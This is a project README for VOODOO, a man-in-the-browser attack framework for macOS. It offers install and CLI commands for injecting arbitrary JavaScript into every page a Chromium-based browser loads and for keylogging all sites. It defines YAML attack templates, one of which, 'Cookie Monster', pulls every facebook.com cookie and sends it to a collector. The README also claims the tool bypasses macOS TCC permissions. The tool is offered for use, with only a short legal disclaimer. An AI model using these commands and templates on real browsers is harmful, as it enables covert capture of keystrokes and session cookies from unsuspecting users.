# VOODOO
VOODOO is a Man in the browser attack framework for macOS.
It comes with built-in keylogging, and scripting capabilities.
VOODOO is highly extendable & shareable, it can execute `YAML` templates that define complex attacks.

<p align="center">
    <br />
    <img src="./.github/voodoo.svg" width="50%" />
</p>

## Browser Support

| [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/edge/edge_48x48.png" alt="IE / Edge" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Edge | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/chrome/chrome_48x48.png" alt="Chrome" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Chrome | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/opera/opera_48x48.png" alt="Opera" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Opera | [<img src="https://github.com/alrra/browser-logos/raw/main/src/brave/brave_48x48.png" alt="Brave" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Brave | [<img src="https://github.com/alrra/browser-logos/raw/main/src/chromium/chromium_48x48.png" alt="Chromium" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Chromium |
| --------- | --------- | --------- | --------- | --------- |
| macOS only | macOS only | macOS only | macOS only | macOS only

## Demo
[![VOODOO](https://img.youtube.com/vi/4wTpdh06H_o/1.jpg?s)](https://www.youtube.com/watch?v=4wTpdh06H_o)

## Why?
In macOS keylogging, webcam and microphone access usually require TCC permissions, VOODOO bypass all of this using chromium based browsers extensions.
**VOODOO does not require root privileges or any TCC permissions to work.**

## Legal Disclaimer
Usage of this code for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.

## Features
* 📜 Content Scripts - inject arbitrary JavaScript to any page
* 🔑 Keylogger - records user keystrokes on any site
* 📋 VOODOO Templates - run advance man in the browser attacks from template files

## Quick start
```sh
$: sudo gem install get-voodoo
```
OR

```sh
$: gem install get-voodoo --user-install
```

When installation without `sudo` make sure that `/Users/[user]/.gem/ruby/[version]/bin` is in your `PATH`.

## Building
```sh
$: git clone https://github.com/breakpointHQ/VOODOO.git
$: cd ./VOODOO
$: gem build ./voodoo.gemspec
$: gem install ./get-voodoo-X.X.X.gem
```

## CLI

```sh
$: voodoo
Commands:
  voodoo help [COMMAND]    # Describe available commands or one specific command
  voodoo keylogger         # Records user keystrokes
  voodoo script <js/path>  # Add a content script
  voodoo template <path>   # Execute a VOODOO template
  voodoo version           # Prints voodoo version
```

## Adding content script

```sh
$: voodoo help script
Usage:
  voodoo script <js/path>

Options:
  x, [--urls=one two three]         
  f, [--format=FORMAT]              # pretty, json, payload, none
                                    # Default: pretty
  o, [--output=OUTPUT]              # File path
  p, [--params=key:value]           
  m, [--matches=one two three]      
                                    # Default: ["*://*/*"]
  b, [--browser=BROWSER]            
                                    # Default: chrome
  p, [--permissions=one two three]  
      [--max-events=N]              

Add a content script
```

Execute JS on every page loaded on the Opera browser.
```sh
$: voodoo script "alert('Hello VOODOO!');" -b opera
```

Execute JS on every page matches `https://example.com/*`
```sh
$: voodoo script "alert('Example VOODOO!');" -b chrome -m "https://example.com/*"
```

Execute JS on every page loaded on Google Chrome, and open `https://example.com`.
```js
$: voodoo script /tmp/myjs.js -b chrome -x "https://example.com"
```

## Intercept browser traffic

This is no longer supported due to migration to the v3 chrome extension manifest.

## Keylogger
```sh
$: voodoo help keylogger
Usage:
  voodoo keylogger

Options:
  x, [--urls=one two three]     
  f, [--format=FORMAT]          # pretty, json, payload
                                # Default: pretty
  o, [--output=OUTPUT]          # File path
  m, [--matches=one two three]  
                                # Default: ["*://*/*"]
  b, [--browser=BROWSER]        
                                # Default: chrome
      [--max-events=N]          

Records user keystrokes
```

Record user keys only when the url matches `https://example.com/*`
```sh
$: voodoo keylogger -m "https://example.com/*"
```

## Templates

A VOODOO template is a `YAML` file that is used to define a man in the browser attack.

```sh
$: voodoo help template
Usage:
  voodoo template <path>

Options:
  b, [--browser=BROWSER]     
  f, [--format=FORMAT]       # json, payload, none
                             # Default: none
  o, [--output=OUTPUT]       # File path
  x, [--urls=one two three]  
  p, [--params=key:value]    
      [--max-events=N]       

Execute a VOODOO template
```

A template must have have 3 main blocks: `info`, `scripts`, and `browser` and 2 optional settings `format` and `permissions`.

### Information

The `info` block holds important information about your template. Info block provides `name`, `author`, and `description`.
`info` block also supports dynamic fields, so you can define any key: value blocks to provide more useful information about the template.

Info block example:
```yaml
info:
  name: Change the Title of example.com
  author: Mr. Test
  description: Overwrite the contents of the h1 tag in example.com every time the user visits it.
```

### Scripts
The `scripts` block define the content scripts and background scripts that will be injected to the browser.
You can spesify the following attributes for each script:

| Name      | Type      | Description | Default |
| --------- | --------- | --------- | --------- | 
`matches` | array of strings | Specifies which pages this content script will be injected into. | `*://*/*` |
`content` | string | Specifies the JavaScript code that will be executed | `nil` |
`file` | string | Specifies the path to a JavaScript file that will be executed | `nil` |
`background` | boolean | Specifies whether or not this is a background script | `false` |
`communication` | boolean | Specifies whether a `collector` server should be spawned for this script. | `true` |

### Scripts block examples:

Inject a content script from a file to every page
```yaml
scripts:
  - matches: "*://*/*" # Inject to every page
    file: ./keylogger.js # A JS file from the same folder as the template file
```

Overwrite the title of example.com and example.net
```yaml
scripts:
  - matches:
      - https://example.com/*
      - https://example.net/*
    content: document.querySelector('h1').innerText = 'VOODOO Example!';
```

Inject a background script that will report back on every tab update.
```yaml
scripts:
  - content: chrome.tabs.onUpdated.addListener((_,tab) => VOODOO.send(tab));
    background: true
```

A template file looks like this:

```yaml
info:
  name: Change the Title of example.com
  author: Mr. Test
  description: Overwrite the contents of the h1 tag in example.com every time the user visits it.

scripts:
  - matches: https://example.com/*
    content: document.querySelector('h1').innerText = "VOODOO Example";

browser:
  default: opera
  urls:
    - https://example.net/
    - https://example.com/
```

### JavaScript API
When `communication` is `true`, content and background scripts can access the `VOODOO` object which expose the following APIs.

### VOODOO.send(:data)
Write data to the selected output format.

| Name      | Type      | Description | Default |
| --------- | --------- | --------- | --------- | 
| data       | `any`   | the data you like to write to the selected output format. | `nil`

### VOODOO.log(:str)
Write information to stdout.

| Name      | Type      | Description | Default |
| --------- | --------- | --------- | --------- | 
| str       | `string`   | the message you like to write to the VOODOO cli stdout | `nil`

### VOODOO.kill(:options)
Stop the collector thread.

| Name      | Type      | Description | Default |
| --------- | --------- | --------- | --------- | 
| options   | `object`  | addional configuration | `{}`
| options.close_browser | `boolean`  | when set to `true` the browser process will be killed | `false`

### Dynamic Parameters
You can pass custom parameters to your template using the `--params` option, it accepts key value pairs in the following format `name:john age:42`.
Those values could later be used in your script like that: `%{name}` `%{age}`.

You can see an example template that uses parameters at `templates/cookie-monster.yaml`.

### Permissions
The `permissions` property is used to declare the necessary permissions for your VOODOO script.
By default VOODOO sets the following permissions:
`tabs`, `*://*/*`, `webRequest`

Here is an example of a template that uses the `cookies` permission to extract `facebook.com` cookies.
```yaml
info:
  name: Cookie Monster

format: payload

permissions:
  - cookies

scripts:
  - content: |
      chrome.cookies.getAll({domain: "facebook.com"}, cookies => {
        VOODOO.send(cookies)
        VOODOO.kill();
      });
    background: true
```

### Browser
The `browser` block is a key value object that defines browser related settings for the template.
Please note, the `name` setting can be overwrited using the `--browser` or `-b` CLI option.
The `urls` setting can also be overwrited using the `--urls` or `-x` CLI options.

| Name      | Type      | Description | Default | 
| --------- | --------- | --------- | --------- |
| default   | string    | supported browser short name `chrome`, `opera`, `edge`, `brave`, `chromium` | `chrome`
| urls      | array of strings | list of urls to open right after we hijack the browser. | `NULL`

### Format
The `format` property sets the default output format for the template.
Please note, this setting can be overwrited using the `--format` or `-f` CLI option.

```yaml
info:
  name: Title Spy
  description: Extract the title from any https site the user visits

format: payload

scripts:
  - matches: https://*/*
    content: 'VOODOO.send({title: document.title})'

browser:
  default: opera
```

## Ruby API

The underline Ruby API can also be used for advance integrations.

```rb
require 'voodoo'

browser = VOODOO::Browser.Chrome
                       # .Opera
                       # .Edge
                       # .Chromium

# Execute JS on example.com
browser.add_script(content: 'alert("VOODOO Example!");',
                   matches: 'https://example.com/*')

# Inject a keylogger to every page
browser.keylogger do |event|
    print event[:payload][:log]
end

# hijack the browser, and open example.com
browser.hijack 'https://example.com'
```

## Development

Running project tests
```sh
$: bundle exec rake test
```

## Contributing
* File an issue first prior to submitting a PR!
* If applicable, submit a test suite against your PR

## TO DO
* Windows/Linux support
* Ruby API documentation
